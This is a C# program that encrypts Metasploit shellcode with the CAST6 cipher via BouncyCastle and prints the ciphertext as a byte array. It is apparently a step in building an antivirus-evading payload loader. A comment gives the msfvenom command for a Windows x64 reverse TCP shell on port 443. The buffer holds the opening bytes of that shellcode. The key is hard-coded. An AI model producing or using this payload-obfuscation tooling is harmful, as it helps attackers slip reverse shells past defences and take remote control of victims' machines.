using System;
using System.Text;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Paddings;
using Org.BouncyCastle.Crypto.Parameters;

// Make sure you add BouncyCastle.Crypto.dll to the project

class Encryption
{
    static void Main()
    {
        // msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 EXITFUNC=thread -f csharp
        byte[] buf = new byte[6] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8 }; 
        string keyString = "Ir0nHu1k!"; // Encryption key
        int keySize = Math.Max(10, Math.Min(32, keyString.Length));
        byte[] key = new byte[32];
        Array.Copy(Encoding.UTF8.GetBytes(keyString), key, Math.Min(keySize, keyString.Length));

        // Initialize CAST6 encryption algorithm
        Cast6Engine engine = new Cast6Engine();
        KeyParameter keyParam = new KeyParameter(key);
        ParametersWithIV keyParamWithIV = new ParametersWithIV(keyParam, new byte[engine.GetBlockSize()]);
        BufferedBlockCipher cipher = new PaddedBufferedBlockCipher(new CbcBlockCipher(engine));

        cipher.Init(true, keyParamWithIV);

        // Encrypt the data
        byte[] encrypted = EncryptData(cipher, buf);

        // Display the encrypted data
        Console.WriteLine("byte[] encryptedData = new byte[" + encrypted.Length + "] { " + ByteArrayToString(encrypted) + " };");
    }

    static byte[] EncryptData(BufferedBlockCipher cipher, byte[] data)
    {
        int outputSize = cipher.GetOutputSize(data.Length);
        byte[] output = new byte[outputSize];
        int bytesProcessed = cipher.ProcessBytes(data, 0, data.Length, output, 0);
        cipher.DoFinal(output, bytesProcessed);

        return output;
    }
    static string ByteArrayToString(byte[] array)
    {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < array.Length; i++)
        {
            sb.Append("0x" + array[i].ToString("X2"));
            if (i < array.Length - 1)
            {
                sb.Append(",");
            }
        }
        return sb.ToString();
    }
}
